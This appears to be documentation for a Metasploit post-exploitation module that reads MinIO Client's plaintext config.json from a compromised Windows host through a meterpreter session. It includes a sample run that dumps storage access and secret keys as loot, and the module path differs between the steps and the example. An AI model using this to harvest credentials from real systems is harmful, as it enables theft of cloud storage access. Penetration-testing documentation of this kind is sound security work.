## Vulnerable Application
[MinIO Client](https://dl.min.io/client/mc/release/)
The MinIO Client mc command line tool provides a modern alternative to UNIX commands like ls,
cat, cp, mirror, and diff with support for both filesystems and Amazon S3-compatible cloud storage services.
Its credential file is saved in the user's home directory in plaintext json.
## Installation Steps

  1. Download the latest installer of MinIO Client (https://dl.min.io/client/mc/release/).
  2. Run `mc alias set myminio https://play.min.io minioadmin minioadmin`.
  3. Run `mc admin info myminio`,check for working.

## Verification Steps

  1. Get a `meterpreter` session on a Windows host.
  2. Do: `run post/multi/gather/minio_client`
  3. If the configuration file is found in the system, it will be printed out

## Options

### CONFIG_PATH

Specifies the config file path for MinIO Client (eg. `C:\Users\FireEye\mc\config.json`)

## Scenarios

```
meterpreter > run post/windows/gather/credentials/minio_client CONFIG_PATH="C:\Users\FireEye\mc\config.json"

[*] Parsing file C:\Users\FireEye\mc\config.json
MinIO Client Key
================

name     url                             accessKey             secretKey                                 api   path
----     ---                             ---------             ---------                                 ---   ----
gcs      https://storage.googleapis.com  YOUR-ACCESS-KEY-HERE  YOUR-SECRET-KEY-HERE                      S3v2  dns
local    http://localhost:9000                                                                           S3v4  auto
myminio  https://play.min.io             minioadmin            minioadmin                                s3v4  auto
play     https://play.min.io             Q3AM3UQ867SPQQA43P2F  zuf+tfteSlswRu7BJ86wekitnifILbZam1KYY3TG  S3v4  auto
s3       https://s3.amazonaws.com        YOUR-ACCESS-KEY-HERE  YOUR-SECRET-KEY-HERE                      S3v4  dns

[+] Session info stored in: /home/kali-team/.msf4/loot/20221206193240_default_172.16.153.128_host.minio_756923.txt
```
